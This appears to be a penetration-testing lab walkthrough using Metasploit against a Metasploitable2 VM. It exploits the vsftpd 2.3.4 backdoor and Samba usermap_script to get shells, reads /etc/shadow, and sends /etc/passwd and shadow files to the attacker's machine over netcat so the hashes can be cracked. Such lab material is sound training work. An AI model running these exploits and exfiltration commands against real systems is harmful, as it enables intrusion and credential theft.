## Exploitation (Metasploit)
Metasploit is an open source platform for vulnerability research, exploit development, and the creation of custom security tools.

Here, we'll use it to attack the Metasploitable2 VM

#### Getting started
- Update and upgrade Kali
`sudo apt update && sudo apt upgrade`

- Start the postgreSQL service - Metasploit uses this as its backend
`sudo systemctl start postgresql`

- Initialise the Metasploit PostgreSQL Database (you only run this ONCE)
`sudo msfdb init`

- Launch msfconsole
`msfconsole`

- Verify Database connectivity
```bash
msf6> db_status
# Should show [*] Connected to msf. Connection type: post
```

- Create a workspace for the exploit
`workspace -a metasploitable2-exploit`
> To select this workspace in future, type: `workspace metasploitable2-exploit`

- Run nmap over the subnet of the target VM:
`db_nmap -A <TARGET-IP>/24

- To view hosts found in the scan:
`hosts`

- Verify services found in the scan:
`services`

FTP servers running:
```bash
vsftpd 2.3.4
ProFTPD 1.3.1
```

## Exploiting  VSFTPD
search for the first target FTP application - VSFTPD
`search type:exploit name:vsftpd`

- Select the exploit you found above
```bash
msf6> use exploit/unix/ftp/vsftpd...
```
- to gain more info about the exploit
`info`

We have 2 required fields: RHOSTS and RPORT (R - Remote)

```bash
msf6> set RHOSTS aaa.bbb.ccc.ddd   # Must set remost host (IP address of Metasploitable2 VM)
msf6> set RPORT XXXX     # Must set remote port
```
- Run the exploit
```bash
msf6> exploit
```

The exploit brings us into a shell environment where we can run linux commands e.g:
`whoami`
`uname -a`

At this point i got thrown back into the msf6 console, as the spawned shell is very fragile. However, you can try getting back in using:
`sessions -i <id>`

- You can get ID from the previous command that created the shell (normally `1`)


- obtain the hashed passwords from the `/etc/shadow` file
`cat /etc/shadow | grep '$1'`


## Exploiting Samba
Samba is an open source implementation of Microsoft file and printer sharing protocols, as well as Active Directory.

```bash
msf6> search type:exploit name:samba
```

- we can find the version number of samba from the previous scans to find the exploit for that specific version

```bash
msf6> use exploit/multi/samba/usermap_script
msf6> info
msf6> options
msf6> set RHOSTS aaa.bbb.ccc.ddd   # Must set remote host (IP address of Metasploitable2 VM)
msf6> set LHOST www.xxx.yyy.zzz    # Must set local host (IP address of Kali VM)
msf6> exploit
```

```bash

[*] Started reverse TCP handler on 10.0.2.15:4444
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.5:57027) at 20266-01-30 05:34:25 -0500
```

### Using Netcat for exfiltration of data from the target
- On a new terminal tab, run the netcat utility listening on port 4567
```bash
nc -l -p 4567 > passwd.txt
```
- On the msf6 terminal, we can send the /etc/passwd file, which will be received by netcat and stored in passwd.txt

```bash
cat /etc/passwd | nc <KALI_IP> 4567
```
There will be no progress or sign of activity, since we are piping the output to a file.
- Stop netcat, and inspect the contents of the new file `passwd.txt`

-Repeat the above commands to extract the `/etc/shadow` file as well

- Use the `unshadow` command to merge the two files
```bash
unshadow passwd.txt shadow.txt > metasploit
```
